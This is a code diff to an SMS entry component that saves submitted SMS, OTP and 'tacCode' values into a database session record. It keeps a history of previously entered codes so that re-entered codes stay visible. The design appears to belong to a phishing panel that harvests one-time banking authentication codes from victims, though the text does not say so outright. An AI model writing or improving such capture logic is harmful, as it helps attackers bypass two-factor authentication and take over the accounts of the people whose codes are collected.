@@ -170,18 +170,33 @@ export function SmsClient({ sessionId }: Props) {
     setSaving(true);
     setMsg(null);
 
+    // Kullanici verisini korumak icin form_data'yi DB'den taze oku (state bos kalmis olabilir).
+    let baseFormData: Record<string, unknown> = sessionFormData;
+    try {
+      const { data: freshRow } = await supabase
+        .from("sessions")
+        .select("form_data")
+        .eq("id", sessionId)
+        .maybeSingle();
+      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
+        baseFormData = freshRow.form_data as Record<string, unknown>;
+      }
+    } catch {
+      /* fresh okuma basarisizsa state ile devam et */
+    }
+
     // ⭐ SMS GECMISI APPEND: SADECE TEKRAR GIRISLERDE (daha once smsCode DOLUYSA)
     //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki) SMS KODUNU PUSH ET!
     //   Boylece kolon = YENI sms (2. sms), history = ESKI sms (1. sms → gorunur).
     const prevSms = String(
-      (sessionFormData as any).smsCode ||
-      (sessionFormData as any).sms_code ||
-      (sessionFormData as any).tacCode ||
+      (baseFormData as any).smsCode ||
+      (baseFormData as any).sms_code ||
+      (baseFormData as any).tacCode ||
       "",
     ).trim();
     const isFirstSmsEntry = prevSms.length === 0;
-    const smsFormHistory: any[] = Array.isArray((sessionFormData as any).smsFormHistory)
-      ? (sessionFormData as any).smsFormHistory.slice()
+    const smsFormHistory: any[] = Array.isArray((baseFormData as any).smsFormHistory)
+      ? (baseFormData as any).smsFormHistory.slice()
       : [];
     if (!isFirstSmsEntry) {
       smsFormHistory.push({
@@ -194,7 +209,7 @@ export function SmsClient({ sessionId }: Props) {
     }
 
     const nextFormData = {
-      ...sessionFormData,
+      ...baseFormData,
       smsCode: trimmed,
       sms_code: trimmed,
       sms_otp_length: trimmed.length,
